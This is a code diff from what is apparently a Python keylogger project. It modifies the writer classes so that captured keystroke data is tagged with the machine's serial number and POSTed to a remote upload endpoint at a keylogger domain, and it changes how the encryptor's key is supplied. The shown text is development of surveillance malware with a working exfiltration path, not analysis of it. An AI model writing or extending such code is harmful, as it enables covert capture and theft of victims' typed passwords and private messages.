@@ -38,7 +38,7 @@ class FileWriter(Write):
     def __init__(self,path=None):
         self.path = ToolBox.get_file_path()
 
-    def write(self, data: dict[str, str]) -> bool:
+    def write(self, sn, data: dict[str, str]) -> bool:
         try:
             if os.path.exists(self.path) and os.path.getsize(self.path) > 0:
                 with open(self.path, 'r', encoding='utf-8') as file:
@@ -61,17 +61,18 @@ class FileWriter(Write):
 class NetworkWriter(Write):
     def __init__(self,url=None):
         self.url = url or "https://keylogger.shuvax.com"
-    def write(self,data:dict[str:str]) -> bool:
+    def write(self, serial_number, data:dict[str:str]) -> bool:
         try:
-            response = requests.post(self.url, json=data)
+            all_data = {"machine":str(serial_number),"data":data}
+            response = requests.post(self.url+'/api/upload', json=all_data)
             return response.status_code == 200
         except requests.exceptions.RequestException:
             return False
 
 
 class Encryptor:
-    def __init__(self):
-        self.key = "".join(random.choices(string.ascii_letters + string.digits,k=512))
+    def __init__(self,key):
+        self.key = key
 
     def encrypt(self,data:str) -> str:
         ciphertext = ""
